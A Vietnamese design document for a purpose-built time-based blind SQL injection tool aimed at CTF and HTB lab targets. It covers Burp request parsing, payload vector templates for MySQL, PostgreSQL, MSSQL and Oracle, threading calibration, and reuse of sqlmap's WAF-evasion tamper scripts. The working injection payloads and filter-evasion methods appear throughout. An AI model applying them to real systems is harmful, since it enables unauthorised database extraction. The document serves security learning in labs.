# Thiết kế: Công cụ khai thác Inline Time-based Blind SQLi

> Tài liệu này ghi lại ý tưởng và các quyết định thiết kế đã thống nhất trong quá trình bàn bạc.
> Đây là bản thiết kế (design doc), chưa phải là code triển khai.

---

## 1. Bối cảnh & Động cơ

### Vấn đề với sqlmap ở dạng time-based
- Khả năng khai thác **time-based** của sqlmap **không ổn định**: dùng ngưỡng thời gian tĩnh
  và cơ chế thống kê chung, không hiệu chỉnh theo jitter thực tế của từng target → nhiều
  false positive / false negative trên mạng nhiễu.
- sqlmap tối ưu cho **tính tổng quát** (dò DBMS, thử hàng loạt payload, mọi ngữ cảnh), không
  tối ưu cho **tốc độ**. Với một lab CTF đã biết chính xác điểm inject và ngữ cảnh, phần lớn
  công sức đó là dư thừa.

### Mục tiêu
Xây một **khung (framework) chuyên dụng** để khai thác **inline injection** cần dùng kỹ thuật
**time-based**, phục vụ giải các **lab CTF** một cách **nhanh chóng và chính xác**.

---

## 2. Phạm vi & Định nghĩa

### "Inline injection" là gì (trong ngữ cảnh này)
Điểm inject cho phép **nhúng thẳng một mệnh đề con vào biểu thức của truy vấn** mà **không cần
ký tự đặc biệt để ngắt chuỗi** (không cần `'`, `--`, ...). Payload được ghép trực tiếp vào
ngữ cảnh **numeric**.

Ví dụ điểm inject (target tham chiếu):
```
{"id":"(if(<cond>,sleep(N),1))"}
```
Khác với SQLi cổ điển kiểu `' OR 1=1 --` phải phá vỡ chuỗi trước.

### Không phụ thuộc method / ngữ cảnh câu lệnh
- Tool **không quan tâm** query gốc là `SELECT`, `INSERT`, hay method HTTP nào.
- Điều kiện duy nhất: **request có điểm inline injection**.
- **Hệ quả quan trọng:** vì tool cố tình không biết ngữ cảnh (SELECT đọc thuần hay INSERT
  ghi/khóa DB), nó **không thể mặc định bật đa luồng** — phải để chính target quyết định
  (xem mục 5).

---

## 3. Đầu vào: file request (Burp Suite)

### Format
- File request theo chuẩn **Burp Suite** ("Copy to file" / "Save item") — tức **raw HTTP
  request** nguyên văn.
- Ví dụ:
  ```
  POST /action.php HTTP/1.1
  Host: 154.57.164.72:32442
  Content-Length: 26
  Content-Type: application/json
  ...

  {"id":"*"}
  ```

### Marker điểm inject — tường minh
- Người dùng **tự chèn marker** vào đúng vị trí inject trong file request.
- Theo quy ước của **sqlmap** (`-r` + `*`): dùng dấu **`*`** làm marker.
- Tool thay marker bằng payload time-based.

### Quy ước chèn payload
- Marker nằm **bên trong giá trị JSON string** (với target hiện tại: bên trong chuỗi `id`).
- Tool chèn **payload thô** vào vị trí marker (không tự JSON-escape), vì payload cần nằm
  nguyên trong ngữ cảnh chuỗi để tới được SQL.
- ⚠️ **Cần kiểm chứng lại quy ước này khi triển khai** cho các ngữ cảnh khác (payload lọt ra
  ngoài chuỗi JSON sẽ hỏng cú pháp JSON trước khi tới SQL).

---

## 4. Transport (gửi request) — theo cơ chế sqlmap

Tham khảo codebase sqlmap: <https://github.com/sqlmapproject/sqlmap>
(hàm `_setRequestFromFile()` / `parseRequestFile()` trong `lib/parse/payloads.py`,
`lib/core/option.py`).

### Logic parse raw HTTP request (học từ sqlmap)
1. **Dòng đầu**: regex `([A-Z]+) ([^ ]+) HTTP/[0-9.]+` → tách **method** và **path/URI**.
2. **Headers**: đọc từng dòng `key: value` cho tới dòng trống; strip whitespace ở value.
3. **Host header**: xử lý đặc biệt để dựng URL đầy đủ:
   - Nếu không có scheme: port `443` → `https`, còn lại → `http`.
   - Dựng URL bằng `urljoin()`.
4. **Body**: phần sau dòng trống (hỗ trợ cả `\r\n\r\n` và `\n\n`).
5. **Marker `*`**: đánh dấu điểm inject (trong URL và/hoặc body).

### ⚠️ Các bẫy phải xử lý (kinh nghiệm)
- **`Content-Length` phải tự tính lại** sau khi chèn payload. Header gốc trong file (vd
  `Content-Length: 26`) sẽ SAI khi payload dài hơn marker → server đọc thiếu/thừa body.
  Đây là lỗi kinh điển của tool tự chế.
- **`Connection: close`** thay vì keep-alive để tránh `Keep-Alive: timeout=N` trùng/nhiễu với
  `sleep(N)`.
- Giữ **trung thành** với header gốc từ Burp (User-Agent, Content-Type, ...) để không bị filter.

---

## 5. Đa luồng: "song song có kiểm chứng, tự hạ cấp"

> **Nguyên tắc nền:** Không để độ tin cậy phụ thuộc vào một giả định mà tool cố tình từ chối
> biết. Tool không biết SELECT hay INSERT → **để chính target quyết định** qua đo đạc thực tế.

### Ưu tiên đã chốt
- **Độ tin cậy > tốc độ**, nhưng **không được quá chậm**.
- Đây là lý do có đa luồng: **song song theo từng vị trí ký tự** của chuỗi cần trích xuất
  (mỗi vị trí `i` đọc `ord(substr(...,i,1))` là một tác vụ độc lập → chia cho worker pool).

### calibrate() mở rộng — TỰ ĐO và TỰ QUYẾT (đã chốt)
Ngoài đo baseline 1 luồng như hiện tại, thêm bước **đo khả năng song song của server**:
1. Bắn **N request `sleep(delay)` cùng lúc**, đo tổng thời gian.
   - Hoàn thành trong ~`delay`s → server xử lý song song thật → connection pool đủ rộng →
     **bật đa luồng**.
   - Cộng dồn thành ~`N × delay`s → server nghẽn/khóa (giống INSERT 1-connection) →
     **tự động hạ cấp về tuần tự**.
2. **Đo jitter ở nhiều mức song song** (vd 2, 4, 8 luồng) và chọn **mức worker cao nhất mà
   jitter vẫn nằm trong ngưỡng an toàn**. Tự tìm điểm cân bằng, không ép người dùng đoán số
   luồng.

### ⚠️ Phản biện đã ghi nhận
Đa luồng có thể **tự bào mòn độ tin cậy**: nhiều kết nối đồng thời thường làm baseline và độ
lệch của *từng* request xấu đi so với chạy tuần tự → phá chính phép đo time-based. Vì vậy số
worker **phải do calibrate đo và quyết định**, không để chỉnh mò.

### Cơ chế chọn số luồng (đã chốt)
- **Tự đo và tự quyết định** là mặc định.
- (Tùy chọn cân nhắc khi triển khai: cờ `--threads` để override thủ công.)

---

## 6. Lớp độ tin cậy (ưu tiên số 1 — độc lập với đa luồng)

Đa luồng là chuyện tốc độ. Độ tin cậy nằm ở tầng khác và **luôn bật**:

- **Ngưỡng động theo jitter**: `threshold = baseline + max(delay*0.45, jitter*4)` (đã có trong
  script cũ). Cảnh báo khi jitter quá lớn so với `--delay`.
- **`verify()` cuối cùng bằng hex literal**: chốt toàn chuỗi bằng **1 request**, dùng
  `(query) between 0x<hex> and 0x<hex>` → không cần dấu nháy. (Đã có, giữ nguyên.)
- **Re-measure khi mập mờ**: nếu `dt` rơi vào vùng xám quanh threshold (không rõ true/false),
  **đo lại vị trí đó** — thay vì `--votes` cào bằng mọi request. (Cải tiến so với script cũ.)
- **Kiểm tra sleep() thực sự hoạt động** trước khi chạy (đã có trong `calibrate`): nếu sleep
  không tạo trễ → oracle chết → thoát sớm với thông báo rõ ràng.

---

## 7. Hệ thống Vector Payload (tạo sẵn — tự dò khi chạy)

> Một payload cứng KHÔNG cover hết mọi ngữ cảnh time-blind MySQL (bằng chứng: sqlmap có cả
> kho vector trong `time_blind.xml` — sleep trần, query-SLEEP bọc subquery, BENCHMARK,
> heavy-query...). Giải pháp: **tạo sẵn một tệp vector, khi chạy tự dò vector nào trigger
> đúng, chốt vector đó cho toàn bộ khai thác.**

### Cơ chế (đã chốt)
```
1. Đọc file vector (YAML, tạo sẵn)
2. calibrate: với MỖI vector, XÁC NHẬN bằng test TRUE + FALSE (xem dưới)
3. Vector đầu tiên vượt qua xác nhận → CHỐT cho toàn bộ khai thác về sau
4. Lưu baseline/threshold ĐO RIÊNG cho vector đã chốt (mỗi vector overhead khác nhau)
5. Dùng vector đã chốt để trích xuất
```

### Xác nhận vector = test TRUE và FALSE (đã chốt — nền tảng độ tin cậy)
Time-based blind KHÔNG đọc được response → oracle **duy nhất là thời gian**. Để biết một vector
có thật sự phân biệt được đúng/sai (chứ không phải delay giả), gửi **2 request với điều kiện đã
biết trước kết quả**:

| Điều kiện cắm vào `[INFERENCE]` | Kỳ vọng | Ý nghĩa nếu SAI kỳ vọng |
|---|---|---|
| `1=1` (luôn đúng) | Response **chậm ~N giây** | sleep không chạy được ở ngữ cảnh này / bị filter → loại |
| `1=2` (luôn sai) | Response **nhanh** | Vector delay cả khi điều kiện sai → **oracle giả**, loại |

**Chỉ nhận vector khi CẢ HAI đúng.** Bước `1=2` là phép đối chứng loại bỏ delay-giả do:
- Lỗi cú pháp làm server chậm (tưởng nhầm là sleep).
- Mạng lag ngẫu nhiên.
- Vector luôn delay bất kể điều kiện.

> ⚠️ Chỉ test "có delay" (mỗi `1=1`) thì tiết kiệm 1 nửa request khi dò, NHƯNG dễ chọn nhầm
> oracle giả → đọc SAI cả flag. Đã bác bỏ phương án này.

### Format file vector: YAML (đã chốt)
Vector là **template** có placeholder, KHÔNG phải payload cứng:
- `[INFERENCE]` — chỗ cắm điều kiện. Lúc dò: `1=1` / `1=2`. Lúc khai thác: cắm điều kiện
  binary-search, vd `ord(substr(hex((<query>)),i,1)) between 48 and 57`.
- `[SLEEPTIME]` — số giây sleep (từ `--delay`).
- `[RANDNUM]` / `[RANDSTR]` — số/chuỗi ngẫu nhiên (giống sqlmap, tránh cache & đặt tên alias).

Ví dụ `vectors.yaml`:
```yaml
- name: inline-scalar-sleep
  template: "(if([INFERENCE],sleep([SLEEPTIME]),1))"
  note: "scalar/numeric context — INSERT id, giá trị số. Vector mặc định target hiện tại."

- name: subquery-sleep
  template: "(select [RANDNUM] from (select(sleep([SLEEPTIME]-if([INFERENCE],0,[SLEEPTIME]))))[RANDSTR])"
  note: "an toàn cho ORDER BY / JOIN — kiểm soát sleep chỉ chạy 1 lần (tránh JOIN gọi sleep nhiều lần)"

- name: benchmark-fallback
  template: "(if([INFERENCE],benchmark(3000000,md5(1)),1))"
  note: "khi sleep() bị filter (MySQL < 5.0.12 hoặc WAF chặn SLEEP)"

- name: heavy-query
  template: "(if([INFERENCE],(select count(*) from information_schema.columns a,information_schema.columns b),1))"
  note: "khi cả sleep lẫn benchmark bị chặn — ép DB làm việc nặng"
```

### Thứ tự thử (quan trọng)
Sắp trong file theo nguyên tắc:
1. **Vector kiểm soát được số lần sleep** (subquery-wrapped) ưu tiên cao — tránh case JOIN/
   correlated subquery gọi sleep nhiều lần → nhân thời gian → sai phép đo.
2. Vector phổ biến/nhẹ trước; fallback nặng (benchmark, heavy-query) sau.

### Override: cờ `--vector <name>` (đã chốt)
- Mặc định: tự dò & chốt.
- `--vector inline-scalar-sleep` → bỏ qua bước dò, dùng luôn vector đã biết → tiết kiệm request
  khi đã quen target.

### Ghi chú threshold theo từng vector
Mỗi vector có overhead thời gian khác nhau (subquery/heavy-query nặng hơn scalar). Threshold
phải tính theo **baseline đo được của chính vector đã chốt**, KHÔNG dùng chung một threshold.

### Mở rộng đa-DBMS (đã chốt: cấu trúc 2 tầng + tự dò DBMS)
> Hỗ trợ DBMS khác KHÔNG chỉ là thêm hàm sleep. Khác biệt trải rộng 4 nhóm:

| Thành phần | MySQL | MSSQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| Hàm delay | `sleep(N)` | `WAITFOR DELAY '0:0:N'` | `pg_sleep(N)` | `dbms_lock.sleep(N)` / heavy |
| Điều kiện hóa | `if(cond,sleep,1)` | `IF cond WAITFOR` (**statement**) | `CASE WHEN..THEN pg_sleep` | `CASE WHEN..` |
| Substring | `substr(x,i,1)` | `SUBSTRING(x,i,1)` | `substr(x,i,1)` | `SUBSTR(x,i,1)` |
| Mã ký tự | `ord()`/`ascii()` | `UNICODE()`/`ASCII()` | `ascii()` | `ASCII()` |
| Độ dài | `length()` | `LEN()` | `length()` | `LENGTH()` |
| Hex | `hex()` | `fn_varbintohexstr` | `encode(...,'hex')` | `RAWTOHEX()` |
| Hex literal | `0x41` | `0x41` | `chr()` (không có 0x) | `CHR()` |

> ⚠️ **Ràng buộc quan trọng:** MSSQL `WAITFOR DELAY` là một **statement**, KHÔNG phải scalar
> expression → không nhét inline vào `(if(...))` như MySQL. Giả định "inline scalar" chỉ đúng
> với MySQL/PostgreSQL. Với MSSQL cần ngữ cảnh statement (stacked query) — ghi rõ trong vector.

**Cấu trúc file vector 2 tầng (đã chốt):** mỗi DBMS là 1 block gồm `dialect` (mảnh cú pháp để
`extract()` lắp ráp) + `vectors` (danh sách vector sleep). Thêm DBMS mới = **thêm block YAML,
không sửa code Python**.
```yaml
mysql:
  dialect:
    substr:  "substr({s},{i},1)"
    ascii:   "ord({c})"
    length:  "length({s})"
    hex:     "hex({s})"
    hexlit:  "0x{h}"                 # hex literal cho verify()
  vectors:
    - name: inline-scalar-sleep
      template: "(if([INFERENCE],sleep([SLEEPTIME]),1))"
    - name: subquery-sleep
      template: "(select [RANDNUM] from (select(sleep([SLEEPTIME]-if([INFERENCE],0,[SLEEPTIME]))))[RANDSTR])"

postgresql:
  dialect: { substr: "substr({s},{i},1)", ascii: "ascii({c})", length: "length({s})",
             hex: "encode(({s})::bytea,'hex')", hexlit: "decode('{h}','hex')" }
  vectors:
    - name: pg-sleep-case
      template: "(case when [INFERENCE] then pg_sleep([SLEEPTIME]) else pg_sleep(0) end)"

mssql:
  dialect: { substr: "SUBSTRING({s},{i},1)", ascii: "UNICODE({c})", length: "LEN({s})", ... }
  vectors:
    - name: mssql-waitfor
      template: "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'"
      note: "statement-context — cần stacked query, KHÔNG inline scalar được"

oracle:
  dialect: { substr: "SUBSTR({s},{i},1)", ascii: "ASCII({c})", length: "LENGTH({s})",
             hex: "RAWTOHEX({s})", hexlit: "'{h}'" }
  vectors:
    - name: oracle-heavy
      template: "(case when [INFERENCE] then (select count(*) from all_objects) else 0 end)"
```
Hệ quả: `extract()`/`bsearch()` KHÔNG hardcode `ord(substr(hex(...)))` nữa mà **lắp ráp từ
`dialect`** của DBMS đang dùng.

**Tự dò DBMS (đã chốt):** `--dbms auto` (mặc định) → thử vector của lần lượt từng DBMS tới khi
có vector vượt qua xác nhận TRUE/FALSE → DBMS đó được chốt. Có thể ép `--dbms mysql` để bỏ qua
bước dò (tốn request), khớp với cờ `--vector` để chọn thẳng vector.

---

## 8. Kỹ thuật trích xuất (tái sử dụng từ script cũ)

Ba chế độ đã có, tái dùng gần như nguyên vẹn:

| Mode | Cơ chế | Chi phí | Ghi chú |
|---|---|---|---|
| **hex** | Đọc `hex(content)`, charset `[0-9A-F]`, binary search bằng `BETWEEN` | ~5 req/hex-digit | An toàn nhất; bắt được byte >127 (multibyte) |
| **turbo** | Mã hóa giá trị 0–15 vào **độ dài `sleep()`** (`dt-baseline ≈ value*step`) | **1 req/hex-digit** | Nhanh gấp ~5 lần; có `verify()` chốt lại |
| **char** | Đọc trực tiếp từng ký tự, khoảng 0–255 | ~8 req/ký tự | Đọc thẳng, không qua hex |

Các thành phần logic **tái sử dụng**:
- `Oracle` (gửi payload, đo trễ, bỏ phiếu)
- `bsearch()` (binary search chỉ dùng `BETWEEN` — né filter `>`)
- `get_number()` (đọc số nguyên, tự nới rộng khoảng trên)
- `extract()` (điều phối hex/turbo/char, đo `length()` vs `char_length()` để phát hiện multibyte)
- `turbo_hex()`, `verify()`
- `selftest()` (kiểm chứng logic offline, **không gửi request**)

---

## 8. Hệ thống Tamper (dùng hoàn toàn tamper của sqlmap)

> Mục tiêu: **dùng nguyên xi các tamper script của sqlmap** để biến đổi payload (thay ký tự /
> toán tử) trước khi gửi request — né filter/WAF.

### Quyết định đã chốt
- **Copy tamper vào repo** (không load động từ bản sqlmap ngoài).
- **Repo private** → chấp nhận ràng buộc GPLv2 của sqlmap (nhẹ nhàng vì không phân phối public).
- sqlmap đã có sẵn local tại `./sqlmap/` để tham khảo & copy.

### Contract của tamper (chuẩn sqlmap — PHẢI tôn trọng)
Mỗi tamper là 1 file `.py` expose:
```python
__priority__ = PRIORITY.XXX          # độ ưu tiên khi chain
def dependencies(): ...              # (tùy chọn) khai báo phụ thuộc DBMS
def tamper(payload, **kwargs):       # biến đổi payload rồi return
    return payload
```
Khung của ta phải:
- Load động các file tamper (giống `--tamper=a,b,c` của sqlmap).
- **Chain theo `__priority__`** (sqlmap sắp xếp theo priority, không chỉ theo thứ tự khai báo).
- Truyền `**kwargs` (một số tamper cần `hint`, `delimiter`, ...).

### ⚠️ Phát hiện quan trọng: tamper KHÔNG chạy độc lập
Khảo sát **cả 76 tamper** trong `./sqlmap/tamper/` — **tất cả** đều import từ `lib.core.*`:

| Module phụ thuộc | Số tamper dùng | Độ khó tách |
|---|---|---|
| `lib.core.enums` (PRIORITY, DBMS, HINT) | **Mọi tamper** | Dễ — chỉ là enum/hằng số |
| `lib.core.compat` (`xrange`) | Nhiều | Dễ — `xrange = range` |
| `lib.core.common` (`singleTimeWarnMessage`, `randomRange`, `zeroDepthSearch`, `randomInt`, `randomRange`) | Nhiều | Trung bình — copy hàm tiện ích |
| `lib.core.convert`, `lib.core.settings`, `lib.core.datatype` | Vài | Trung bình — copy được |
| **`lib.core.data` (`kb`)** | **~10 tamper** | **Khó** — knowledge base, trạng thái toàn cục runtime của sqlmap |

Ví dụ `between.py` mở đầu bằng `from lib.core.enums import PRIORITY` → không thể chỉ copy
mỗi file `tamper/*.py` mà chạy được.

### Chiến lược tích hợp (ĐÃ TRIỂN KHAI & KIỂM CHỨNG ✅)
> **Cập nhật sau thực nghiệm:** giả định ban đầu ("copy nguyên cây lib/core") đã bị BÁC BỎ.
> Đo thực tế cho thấy bề mặt phụ thuộc của cả 76 tamper **rất nhỏ**, KHÔNG cần `common.py`
> (4711 dòng). Chỉ cần một **shim `lib/core/` gọn**.

**Bề mặt phụ thuộc thực tế của TẤT CẢ 76 tamper** (đo bằng grep):

| Nguồn | Symbol thực sự cần | Cách xử lý |
|---|---|---|
| `lib.core.enums` | `PRIORITY`, `DBMS`, `HINT` | Copy nguyên enum (giá trị phải khớp) |
| `lib.core.compat` | `xrange` | `xrange = range` |
| `lib.core.common` | CHỈ 4 hàm: `randomInt`, `randomRange`, `singleTimeWarnMessage`, `zeroDepthSearch` | Shim gọn (KHÔNG copy 4711 dòng) |
| `lib.core.convert` | `decodeHex`, `encodeBase64`, `getOrds` | Copy rút gọn (bỏ `six`) |
| `lib.core.datatype` | `AttribDict`, `OrderedSet` | `AttribDict` tự viết; `OrderedSet` copy nguyên |
| `lib.core.settings` | 3 hằng số | Copy giá trị |
| `lib.core.data` | `kb` — CHỈ đọc 3 field: `keywords`, `aliasName`, `bluecoat` | `kb` giả điền sẵn (xem dưới) |

**Vụ `kb` (lo ngại lớn nhất) — thực ra đơn giản:** `kb` trong sqlmap chỉ là một `AttribDict()`
rỗng, điền lúc runtime. 76 tamper chỉ đọc **3 field**. Shim `lib/core/data.py`:
- `kb = AttribDict(keycheck=False)` → field lạ trả `None` thay vì crash.
- `kb.keywords` = nạp từ `data/txt/keywords.txt` (copy từ sqlmap) — dùng bởi randomcase/upper/lower.
- `kb.aliasName` = chuỗi ngẫu nhiên; `kb.bluecoat = False`.

**Cấu trúc đã triển khai:**
```
tamper/              ← copy nguyên 76 tamper .py từ sqlmap (không sửa)
lib/__init__.py
lib/core/            ← SHIM (7 module gọn), giữ nguyên đường import lib.core.*
  ├── __init__.py
  ├── enums.py       PRIORITY / DBMS / HINT
  ├── compat.py      xrange = range
  ├── common.py      4 hàm (randomInt, randomRange, singleTimeWarnMessage, zeroDepthSearch)
  ├── convert.py     decodeHex, encodeBase64, getOrds
  ├── datatype.py    AttribDict, OrderedSet
  ├── settings.py    3 hằng số
  └── data.py        kb (điền sẵn keywords/aliasName/bluecoat)
data/txt/keywords.txt  ← copy từ sqlmap (1627 dòng từ khóa SQL)
stinger/tamper_engine.py  ← loader: load động + chain theo __priority__ giảm dần
```

**Kết quả kiểm chứng (thực nghiệm):**
- ✅ `tests/test_tamper_engine.py`: **10/10 pass** (between, space2comment, randomcase-dùng-kb,
  chain, priority order...).
- ✅ **Load + apply toàn bộ 75 tamper: 75/75 OK, 0 thất bại.**

> Vì sao KHÔNG copy `common.py`: 4711 dòng, kéo theo `settings`+`dicts`+`convert`+`thirdparty.six`
> → biển phụ thuộc. Chỉ 4 hàm được dùng → shim gọn vừa sạch vừa ít vỡ khi sqlmap update
> (bề mặt shim nhỏ, dễ kiểm tra lại).

### Thứ tự pipeline (RẤT QUAN TRỌNG — tránh bẫy Content-Length)
```
1. Đọc request.txt (Burp)  →  tách headers/body, tìm marker '*'
2. Sinh payload time-based  (if(<cond>,sleep(N),1)) / turbo / ...
3. CHAIN TAMPER lên payload  ← biến đổi ở bước này
4. Thay payload (đã tamper) vào vị trí marker
5. TÍNH LẠI Content-Length   ← BẮT BUỘC sau khi payload đã đổi độ dài
6. Gửi request
```
Nếu tamper chạy **sau** khi đã tính Content-Length → Content-Length sai → hỏng.

---

## 10. Ràng buộc đặc thù của target (đã xử lý trong script cũ)

| Ràng buộc | Cách xử lý |
|---|---|
| Boundary rỗng (numeric) | Payload `(if(<cond>,sleep(N),1))` |
| Ký tự `>` bị filter | Chỉ dùng `BETWEEN` để so sánh |
| Response luôn rỗng | Oracle **duy nhất là thời gian** |
| Câu gốc là INSERT → tuần tự | (Nay tổng quát hóa: calibrate tự phát hiện, mục 5) |

---

## 11. Kiến trúc code (ĐÃ TRIỂN KHAI ✅)

Quyết định: **viết mới** khung `request.txt`-based, **tái dùng logic cốt lõi** từ `draft/`
(bsearch, hex decode, verify) nhưng tổng quát hóa theo `dialect` (không hardcode MySQL).

**Các module đã xây & kiểm chứng (44/44 test pass):**
```
stinger/
  ├── request.py        parse Burp + chèn payload + TỰ TÍNH Content-Length   (11 test)
  ├── tamper_engine.py  load động + chain tamper theo __priority__            (10 test)
  ├── vectors.py        nạp vectors.yaml, dò DBMS/vector bằng TRUE/FALSE      (11 test)
  ├── oracle.py         ask() true/false theo thời gian; re-measure vùng xám
  ├── extract.py        bsearch/get_number/hex/char theo dialect; verify       (7 test)
  ├── transport.py      gửi qua requests; cung cấp measure() cho oracle        (2 e2e test)
  └── cli.py            ghép tất cả; entrypoint `python -m stinger.cli`        (3 e2e test)
data/
  ├── vectors.yaml      4 DBMS × dialect + vectors (cấu trúc 2 tầng)
  └── txt/keywords.txt  cho kb.keywords của tamper
lib/core/               shim (7 module) để tamper sqlmap chạy không sửa
tamper/                 76 tamper copy nguyên từ sqlmap
tests/                  6 file test (offline mock + e2e qua HTTP server cục bộ)
```

**Chiến lược test (quan trọng):** target HTB trong `draft/requests.txt` là instance tạm thời
— **đã chết** khi kiểm tra (TCP mở nhưng reset ngay khi có payload → backend hết hạn). Vì vậy
KHÔNG dựa vào nó để test logic. Thay vào đó:
- **Mock oracle offline** (fake MySQL biết flag) test toàn bộ logic — nhanh, tất định.
- **HTTP server cục bộ** (`tests/test_transport.py`) mô phỏng target time-based (sleep thật)
  → test end-to-end cả stack: parse → payload → Content-Length → HTTP → đo tre → trích xuất.
  Kết quả: trích xuất đúng flag `HTB{l0c4l_3nd2end}` qua HTTP thật.
- Khi có instance HTB mới còn sống: chỉ cần thay `draft/requests.txt` (thêm marker `*`) là chạy
  `python -m stinger.cli -r draft/requests.txt` ngay.

**CHƯA làm (ghi để không quên):**
- **Đa luồng theo vị trí ký tự** (mục 5) — hiện `extract()` chạy tuần tự. Khung đã sẵn sàng để
  thêm (mỗi vị trí độc lập), nhưng calibrate-đo-song-song chưa triển khai.
- **Chế độ turbo** (mã hóa giá trị vào độ dài sleep) — cần transport thật để hiệu chuẩn step.
- **`selftest` gộp toàn khung** — hiện mỗi module có test riêng.

---

## 12. Tóm tắt các quyết định đã chốt

| # | Khía cạnh | Quyết định |
|---|---|---|
| 1 | Loại lỗ hổng | Inline injection (nhúng thẳng, không ngắt chuỗi) |
| 2 | Kỹ thuật | Time-based blind (oracle = thời gian) |
| 3 | Đầu vào | File request chuẩn **Burp Suite** (raw HTTP) |
| 4 | Marker inject | **Tường minh**, dùng `*` theo quy ước sqlmap |
| 5 | Transport | Theo **cơ chế sqlmap** (parse raw HTTP, tự tính Content-Length) |
| 6 | Ưu tiên | **Độ tin cậy > tốc độ**, nhưng không quá chậm |
| 7 | Đa luồng | Song song theo vị trí ký tự; **calibrate tự đo & tự quyết** số worker; tự hạ cấp về tuần tự khi server nghẽn |
| 8 | Độ tin cậy | Ngưỡng động + verify hex literal + re-measure vùng xám (luôn bật) |
| 9 | Tamper | **Dùng hoàn toàn tamper sqlmap** ✅ đã triển khai: copy 76 tamper + **shim `lib/core/` gọn** (7 module, KHÔNG copy `common.py`); `kb` giả điền sẵn 3 field; chain theo `__priority__`; tamper TRƯỚC khi tính Content-Length. Kiểm chứng: 75/75 tamper load+apply OK |
| 10 | Vector payload | Tệp **YAML tạo sẵn**; tự dò khi chạy; **xác nhận bằng test TRUE (1=1 chậm) + FALSE (1=2 nhanh)**; chốt 1 vector cho toàn khai thác; cờ `--vector` override |
| 11 | Đa-DBMS | Cấu trúc **2 tầng** (`dialect` + `vectors`) theo DBMS; thêm DBMS = thêm block YAML; **tự dò DBMS** (`--dbms auto`), override `--dbms <name>` |

---

## 13. Bối cảnh hợp lệ

Đây là công cụ khai thác SQLi phục vụ **học tập bảo mật** và giải **lab CTF / HTB Academy**
(mục tiêu là các instance tạm thời của lab). Sử dụng trong ngữ cảnh được phép.
